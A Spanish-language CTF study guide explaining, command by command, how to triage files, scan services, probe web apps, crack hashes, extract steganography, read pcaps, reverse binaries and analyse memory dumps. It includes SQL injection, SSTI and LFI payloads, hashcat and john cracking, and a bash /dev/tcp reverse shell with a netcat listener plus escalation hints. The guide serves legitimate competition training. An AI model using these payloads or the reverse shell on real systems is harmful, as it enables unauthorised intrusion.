# Guía explicada — por qué, cuándo, cómo e interpretar

Complemento de estudio de `COMANDOS.md`. Aquí cada comando trae:
**Por qué** sirve · **Cuándo** usarlo · **Cómo** · **Ejemplo** chico · **Interpretar** (qué significa lo que ves).
Convención: MAYÚSCULAS = lo cambias tú. Formato de bandera del evento: `flag{...}` o `CyberFEI{...}`.

---

# A. Triage — lo primero con cualquier archivo

### `file ARCHIVO`
- **Por qué:** lee los primeros bytes (magic bytes) y dice el tipo **real**, ignorando la extensión. En CTF las extensiones mienten a propósito.
- **Cuándo:** nada más recibir un archivo, siempre el primero.
- **Cómo:** `file sospechoso`
- **Ejemplo:** `file reto.jpg`
- **Interpretar:**
  - `JPEG image data` → es lo que dice, sigue con estego.
  - `Zip archive data` aunque se llame `.jpg` → le cambiaron la extensión; renómbralo a `.zip`.
  - `data` → tipo desconocido o header corrupto/borrado: mira `xxd` y arregla los magic bytes.
  - `ELF 64-bit executable` → binario Linux, vas a reversing.

### `strings -n 6 ARCHIVO`
- **Por qué:** extrae el texto legible escondido entre los bytes. Muchísimas flags están en claro.
- **Cuándo:** con cualquier archivo binario, imagen, dump o ejecutable.
- **Cómo:** `strings -n 6 ARCHIVO` ( `-n 6` = mínimo 6 caracteres, quita ruido).
- **Ejemplo:** `strings -n 6 reto.bin | grep -iE 'flag|cyberfei'`
- **Interpretar:**
  - Sale `CyberFEI{...}` → terminaste, era texto plano.
  - Ves rutas (`/home/user/...`), nombres de función, mensajes ("Wrong password") → pistas de cómo funciona el programa.
  - No sale nada útil → quizá esté comprimido/cifrado dentro: prueba `binwalk`.

### `exiftool ARCHIVO`
- **Por qué:** muestra metadatos: autor, fecha, GPS, software, y el campo **Comment** (donde suelen meter la flag).
- **Cuándo:** imágenes, PDFs, audio, documentos.
- **Cómo:** `exiftool foto.jpg`
- **Ejemplo:** `exiftool -a -G1 foto.jpg` ( `-a` todo, `-G1` agrupado por origen).
- **Interpretar:**
  - Campo `Comment: ZmxhZ3t...` → decodifícalo (parece base64).
  - `GPS Position: 19.4 N, 99.1 W` → el reto pregunta un lugar; busca esas coordenadas.
  - `Software: Adobe...` o fechas raras → posible pista narrativa del reto.

### `binwalk ARCHIVO` / `binwalk -e ARCHIVO`
- **Por qué:** detecta y extrae **archivos escondidos dentro de otro** (un ZIP dentro de un PNG, etc.).
- **Cuándo:** cuando `file`/`strings` no bastan y sospechas algo incrustado.
- **Cómo:** `binwalk reto.png` para ver; `binwalk -e reto.png` para extraer.
- **Ejemplo:** `binwalk -e captura.png`
- **Interpretar:**
  - Lista con `Zip archive`, `PNG image`, `gzip compressed` en distintos offsets → hay varios archivos pegados; `-e` los saca a `_reto.png.extracted/`.
  - Solo una línea con el tipo esperado → no hay nada incrustado, prueba `zsteg`/`steghide`.

### `xxd ARCHIVO | head`
- **Por qué:** volcado hex + ASCII; te deja ver y comparar los **magic bytes** del inicio.
- **Cuándo:** cuando `file` dice `data` o un archivo "no abre".
- **Cómo:** `xxd ARCHIVO | head`
- **Ejemplo:** `xxd reto.png | head -1`
- **Interpretar:** compara el inicio con la firma correcta:
  - PNG debe empezar `89 50 4E 47`. Si ves `00 00 00 00`, le borraron el header → arréglalo con un editor hex.
  - `50 4B 03 04` (`PK`) = ZIP. `FF D8 FF` = JPG. `25 50 44 46` (`%PDF`) = PDF.

---

# B. Red y servicios

### `nmap -sC -sV -p- OBJETIVO`
- **Por qué:** descubre qué puertos/servicios están vivos y su versión → por ahí atacas.
- **Cuándo:** el reto te da una IP o host.
- **Cómo:** `-p-` todos los puertos, `-sV` versión, `-sC` scripts básicos.
- **Ejemplo:** `nmap -sC -sV -p- 10.10.10.5 -oN nmap.txt`
- **Interpretar:**
  - `80/tcp open http Apache 2.4.49` → hay web; apunta `searchsploit apache 2.4.49`.
  - `open` = accesible · `closed` = puerto responde pero sin servicio · `filtered` = firewall lo bloquea (prueba `-Pn`).
  - El número de puerto te dice el camino: 21=FTP, 22=SSH, 80/443=web, 3306=MySQL, 445=SMB.

### `nc OBJETIVO PUERTO`
- **Por qué:** te conecta "a pelo" a un servicio para hablar con él.
- **Cuándo:** retos que te dan `host puerto` (misc, pwn jr, banner grabbing).
- **Cómo:** `nc 10.10.10.5 1337`
- **Ejemplo:** `nc 10.10.10.5 1337`
- **Interpretar:**
  - Te sale un menú o pregunta → responde según pida (a veces es resolver operaciones rápido).
  - Un banner `220 ProFTPD 1.3.5` → versión del servicio → `searchsploit`.
  - Silencio total → quizá espera que TÚ mandes algo primero.

---

# C. Web

### `curl -I http://OBJETIVO`
- **Por qué:** muestra solo las cabeceras de respuesta sin descargar la página.
- **Cuándo:** reconocimiento web rápido; ver servidor, cookies, redirecciones.
- **Cómo:** `-I` solo headers; `-i` headers + cuerpo.
- **Ejemplo:** `curl -I http://OBJETIVO`
- **Interpretar:**
  - `HTTP/1.1 200 OK` → existe y carga. `301/302` → redirige (mira `Location:`). `403` → prohibido (existe pero sin acceso). `401` → pide login. `500` → error del servidor (a veces explotable).
  - `Set-Cookie: role=user` → cookie manipulable (cámbiala a `admin`).
  - `Server: nginx/1.18` / `X-Powered-By: PHP/7.4` → tecnología → exploits.

### `curl` con opciones (POST, cookie, proxy)
- **Por qué:** manda peticiones a medida sin navegador (a veces el navegador oculta cosas).
- **Cuándo:** probar logins, enviar parámetros, pasar por Burp.
- **Cómo:**
  - `curl -X POST -d "u=admin&p=1234" http://OBJETIVO/login` (envía formulario)
  - `curl -b "admin=1" http://OBJETIVO/panel` (manda cookie)
  - `curl -x http://127.0.0.1:8080 http://OBJETIVO` (lo pasa por Burp)
- **Ejemplo:** `curl -s http://OBJETIVO/ | grep -i flag`
- **Interpretar:** compara el cuerpo según cambias la petición. Si al mandar `admin=1` aparece contenido nuevo → la cookie controlaba el acceso.

### `feroxbuster -u http://OBJETIVO` ("ferro")
- **Por qué:** descubre rutas/archivos ocultos probando una wordlist, y baja **recursivamente** en lo que encuentra.
- **Cuándo:** toda web; buscas `/admin`, `/backup`, `/flag.txt`.
- **Cómo:** `feroxbuster -u http://OBJETIVO -x php,txt,bak -d 2 -C 404,403`
- **Ejemplo:** `feroxbuster -u http://OBJETIVO -o ferox.txt`
- **Interpretar la columna de estado:**
  - `200` → existe y accesible (¡míralo!).
  - `301/302` → redirección (suele ser una carpeta; ferox entra solo).
  - `403` → existe pero prohibido (interesante: hay algo que esconden).
  - `401` → pide autenticación.
  - El tamaño (bytes) igual en muchas respuestas = el "404 bonito"; fíltralo con `-C` o por tamaño.

### Inyección SQL — detectar a mano
- **Por qué:** si un input va sin sanear a la consulta SQL, puedes leer la BD.
- **Cuándo:** logins, buscadores, `?id=1`.
- **Cómo:** mete comillas y lógica: `' OR '1'='1`, `admin'--`, `' ORDER BY 3--`.
- **Ejemplo:** en el usuario pon `admin'--` y cualquier contraseña.
- **Interpretar:**
  - Entras sin contraseña válida → inyección confirmada.
  - `ORDER BY 3` funciona pero `ORDER BY 4` da error → hay **3 columnas** (úsalas en el `UNION SELECT 1,2,3--`).
  - Error de SQL en pantalla → vulnerable y encima te filtra el motor (MySQL, etc.).

### SSTI — `{{7*7}}`
- **Por qué:** si la plantilla evalúa tu entrada, puedes llegar a ejecutar código.
- **Cuándo:** campos que reflejan tu texto (nombre, saludo).
- **Cómo:** manda `{{7*7}}` (o `${7*7}`, `#{7*7}`).
- **Interpretar:** si responde `49` → **inyectable** (lo evaluó). Si responde literal `{{7*7}}` → no lo es.

### LFI — `?file=../../../../etc/passwd`
- **Por qué:** subir por el árbol de carpetas deja leer archivos del sistema.
- **Cuándo:** parámetros tipo `?page=`, `?file=`.
- **Interpretar:**
  - Ves `root:x:0:0:` → es `/etc/passwd`: LFI confirmada.
  - Con `php://filter/convert.base64-encode/resource=index.php` te sale base64 → decodifícalo para leer el código PHP (ahí suele estar la flag o credenciales).

---

# D. Contraseñas y hashes

### `hashid 'HASH'`
- **Por qué:** identifica el tipo de hash para elegir el modo correcto al romperlo.
- **Cuándo:** te dan un hash suelto o lo sacaste de una BD.
- **Ejemplo:** `hashid '5f4dcc3b5aa765d61d8327deb882cf99'`
- **Interpretar:** te lista candidatos (`MD5`, `NTLM`...). La longitud ayuda: 32 hex = MD5/NTLM, 40 = SHA1, 64 = SHA256.

### `hashcat -m MODO hash.txt rockyou.txt`
- **Por qué:** prueba millones de contraseñas de un diccionario contra el hash (usa GPU).
- **Cuándo:** ya sabes el tipo (con `hashid`).
- **Cómo:** `-m` el modo (0=MD5, 100=SHA1, 1400=SHA256, 1800=sha512crypt, 3200=bcrypt, 16500=JWT), `-a 0` diccionario.
- **Ejemplo:** `hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt`
- **Interpretar:**
  - `Status: Cracked` + `hash:password` → esa es la contraseña.
  - `Status: Exhausted` → no estaba en el diccionario (prueba máscara `-a 3 '?d?d?d?d'` o reglas).
  - Ver la contraseña después: `hashcat -m 0 hash.txt --show`.

### `john --wordlist=rockyou.txt h.txt` y `zip2john`
- **Por qué:** John rompe hashes y, con `*2john`, archivos protegidos (ZIP, PDF, RAR, SSH).
- **Cuándo:** ZIP/PDF con contraseña, o hashes variados.
- **Cómo:** `zip2john secreto.zip > h.txt && john --wordlist=rockyou.txt h.txt`
- **Ejemplo:** `john --show h.txt`
- **Interpretar:** `secreto.zip:contraseña` → úsala para `unzip`. Si no imprime nada tras terminar → no estaba en el diccionario.

---

# E. Esteganografía

### `zsteg -a img.png`
- **Por qué:** revisa los bits menos significativos (LSB) de PNG/BMP, truco de estego clásico.
- **Cuándo:** imagen PNG/BMP y `strings`/`binwalk` no dieron nada.
- **Ejemplo:** `zsteg -a reto.png`
- **Interpretar:** una línea tipo `b1,rgb,lsb,xy .. text: "CyberFEI{...}"` → ahí está. Puro ruido/basura en todas → no es LSB; prueba `steghide` o Stegsolve.

### `steghide extract -sf img.jpg` / `stegseek img.jpg rockyou.txt`
- **Por qué:** steghide esconde datos con contraseña en JPG/BMP/WAV; stegseek la rompe por diccionario.
- **Cuándo:** JPG/WAV sospechoso.
- **Ejemplo:** `steghide extract -sf reto.jpg` (prueba Enter = sin pass, o palabras del reto).
- **Interpretar:**
  - `wrote extracted data to "secreto.txt"` → ábrelo, ahí viene algo.
  - `could not extract...` con pass vacía → tiene contraseña: usa `stegseek`.
  - stegseek: `Found passphrase: "xxx"` + extrae el archivo → listo.

### Audio → espectrograma
- **Por qué:** muchos mensajes se "dibujan" en el espectro de frecuencias, no se oyen.
- **Cuándo:** el reto te da un audio sin razón aparente.
- **Cómo:** ábrelo en **Audacity** → menú de la pista → **Espectrograma**.
- **Interpretar:** si ves letras/figuras formadas en la imagen del espectro → esa es la flag.

---

# F. Tráfico de red (.pcap)

### Wireshark: Follow TCP Stream
- **Por qué:** reconstruye una conversación completa (lo que mandó cliente y servidor) en texto legible.
- **Cuándo:** casi todo pcap. Es tu reflejo #1.
- **Cómo:** clic derecho en un paquete → Follow → TCP/HTTP Stream.
- **Interpretar:** verás el diálogo crudo; busca `USER`/`PASS`, `POST /login`, o `flag{`. Los textos en rojo/azul separan quién habla.

### `tshark -r cap.pcap -Y "http.request"`
- **Por qué:** Wireshark en terminal; filtra y saca campos sin abrir la GUI.
- **Cuándo:** pcaps grandes, o para pegar salida en el writeup.
- **Ejemplo:** `tshark -r cap.pcap -Y http.request -T fields -e http.host -e http.request.uri`
- **Interpretar:** lista de hosts+rutas pedidas. Una URL rara o repetida (`/admin`, `/exfil?d=...`) marca el punto interesante.

### `tcpdump -r cap.pcap -A | grep -i flag`
- **Por qué:** vuelca el payload en ASCII y lo filtras.
- **Cuándo:** revisión rápida sin abrir Wireshark.
- **Interpretar:** si aparece la flag, ya está. Subdominios DNS larguísimos (`a1b2c3.tunnel.site`) → datos exfiltrados en base32/hex: decodifícalos.

---

# G. Reversing

### `checksec --file=BINARIO`
- **Por qué:** lista las protecciones del binario; definen cómo se ataca (sobre todo en pwn).
- **Cuándo:** antes de meterte a explotar un ELF.
- **Interpretar:**
  - `NX enabled` → no ejecutas shellcode en la pila; usa ROP/ret2libc.
  - `No canary found` → puedes desbordar sin preocuparte del canario.
  - `No PIE` → direcciones fijas (más fácil saltar a una función).

### `ltrace ./BINARIO`
- **Por qué:** muestra las llamadas a librería mientras corre; revela comparaciones.
- **Cuándo:** crackmes, "adivina la contraseña".
- **Ejemplo:** `ltrace ./reto`
- **Interpretar:** si ves `strcmp("loquepuse", "S3cr3t")` → `S3cr3t` es la contraseña correcta (el segundo argumento).

### `strings -n 6 BINARIO | grep -iE 'flag|pass|key'`
- **Por qué:** muchos crackmes jr traen la flag/clave en claro.
- **Interpretar:** si aparece, listo; si no, abre en Ghidra y lee `main` (pseudo-C).

---

# H. Forense de memoria y disco

### `vol -f dump.mem windows.info`
- **Por qué:** Volatility 3 analiza volcados de RAM; `info` da el perfil/SO, base de todo lo demás.
- **Cuándo:** te dan un `.mem`/`.raw`/`.dmp`.
- **Interpretar:** confirma que el dump se lee y qué Windows es. A partir de ahí corres `windows.pslist`, `windows.cmdline`, etc.

### `vol -f dump.mem windows.pslist` / `windows.cmdline`
- **Por qué:** lista procesos y los comandos con que arrancaron.
- **Interpretar:** un proceso raro (`powershell.exe` con argumentos codificados, nombres extraños) o una `cmdline` con `-enc <base64>` → ahí está la actividad maliciosa / la pista.

### `foremost -i disco.img -o salida/`
- **Por qué:** recupera archivos por su firma (file carving), incluso borrados.
- **Cuándo:** imágenes de disco, "recupera el archivo borrado".
- **Interpretar:** en `salida/` aparecen carpetas por tipo (`jpg/`, `pdf/`); revisa los recuperados con `strings`/`exiftool`.

---

# I. Inyección de shell

### `nc -lvnp 4444` (listener en tu Kali)
- **Por qué:** abre un puerto a la escucha donde caerá la shell de la víctima.
- **Cuándo:** antes de lanzar una reverse shell.
- **Interpretar:**
  - Se queda esperando (sin prompt) → está escuchando, bien.
  - Aparece `connect to ... from ...` y luego un prompt → **la shell entró**. Prueba `id`.

### `bash -i >& /dev/tcp/TU_IP/4444 0>&1` (en la víctima)
- **Por qué:** abre una bash y redirige su E/S por TCP hasta tu listener.
- **Cuándo:** tras lograr ejecución de comandos (command injection, upload, servicio).
- **Interpretar:** si en tu `nc` aparece el prompt, funcionó. Si no pasa nada, prueba la variante con `python3` o revisa IP/puerto y que no haya firewall.

### Ya con shell: `id`, `find / -name 'flag*' 2>/dev/null`, `sudo -l`
- **Por qué:** saber quién eres, buscar la flag y ver vías de escalar a root.
- **Interpretar:**
  - `uid=0(root)` → ya eres root, lee todo.
  - `find` lista `/root/flag.txt` pero `cat` da `Permission denied` → necesitas escalar.
  - `sudo -l` muestra un binario que puedes correr como root → búscalo en **GTFOBins** para leer la flag protegida.

---

# J. Buscar la flag en todo (comodín final)
### `grep -raoiE '[A-Za-z0-9_]+\{[^}]+\}' .`
- **Por qué:** barre todos los archivos de una carpeta buscando el patrón `palabra{...}`.
- **Cuándo:** cuando ya extrajiste cosas (binwalk/foremost) y no sabes dónde mirar.
- **Interpretar:** cada línea es `archivo: coincidencia`. Si sale `CyberFEI{...}`, el nombre del archivo te dice dónde estaba.

---

## Cómo leer CUALQUIER resultado (regla mental)
1. ¿Cambió algo respecto a lo "normal"? (otro tamaño, otro código, otra respuesta) → ahí está la pista.
2. ¿Aparece el patrón de la flag? → confírmala con el formato exacto antes de enviar.
3. ¿Un error? Léelo: muchos errores (SQL, stack trace) **te regalan** información del sistema.
4. Si no entiendes la salida, **documéntala igual** en el writeup: a veces el valor está ahí y lo ves al releer.
